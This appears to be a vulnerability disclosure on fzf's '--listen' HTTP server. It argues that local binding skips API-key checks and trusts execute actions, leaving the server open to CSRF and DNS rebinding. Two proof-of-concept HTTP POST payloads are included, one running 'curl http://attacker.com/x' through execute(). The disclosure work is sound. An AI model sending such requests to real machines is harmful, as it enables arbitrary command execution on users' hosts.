Title: Unauthenticated Local HTTP Server Vulnerable to Remote Code Execution via CSRF / DNS Rebinding
Analysis:
The `fzf` simplistic HTTP server started via `--listen` lacks any mechanism for validating requests' origins, such as checking `Host`, `Origin`, or `Content-Type` headers. Furthermore, if the HTTP server is configured to bind to a local address (e.g., `localhost` or `127.0.0.1`), the authentication check using `FZF_API_KEY` is completely bypassed. Specifically:
1. In `src/server.go` lines 79-82, if `address.IsLocal()` evaluates to true, the server is started without requiring an API key (i.e. `FZF_API_KEY` environment variable can be empty).
2. During request processing in `handleHttpRequest` (lines 209-211), if `server.apiKey` is empty, no token comparison is performed, allowing unauthenticated POST requests to pass directly to the backend.

### Reachability and Sink
Because the server accepts all requests matching the `POST / HTTP` method, an external entity (such as a malicious website visited by the user) can use Cross-Site Request Forgery (CSRF) or DNS Rebinding to send commands to the local server. The payload body parses executing actions (e.g. `execute(command)`) which are executed directly on the user's host machine.

### Conceptual Exploit Payload
A malicious website can perform a simple fetch or form POST to the local `fzf` port (discovered via local port scanning) without trigger preflight restrictions:

```http
POST / HTTP/1.1
Host: 127.0.0.1:61234
Content-Length: 29
Content-Type: text/plain

execute(id > /tmp/fzf_pwned)
```

No validation of origin or `Content-Type` is performed, causing `fzf` to parse `execute(id > /tmp/fzf_pwned)` and run the command on the host.

Title: Implicit Trust of Local Server Execution Actions Leading to Command Execution
Analysis:
In `src/terminal.go` (lines 3625-3635), when processing server actions from `serverInputChan`, the code filters out unsafe execution actions (e.g., `execute`, `become`, `reload`) if the listener address is remote and `--listen-unsafe` is not set. 

However, it implicitly trusts all execution actions without restriction if `t.listenAddr.IsLocal()` is true. Since the local interface is accessible to local browsers executing cross-origin requests, this assumption of local boundary security is false. Malicious web pages can trigger these actions over CSRF/DNS Rebinding to execute arbitrary commands locally.

### Conceptual Exploit Payload
A POST request is sent to `http://localhost:PORT/`:

```http
POST / HTTP/1.1
Host: 127.0.0.1:12345
Content-Length: 35
Content-Type: text/plain

execute(curl http://attacker.com/x)
```

Because `t.listenAddr.IsLocal()` is true, the `execute` action bypasses the `processExecution(action.t)` filter, and `curl` is run.
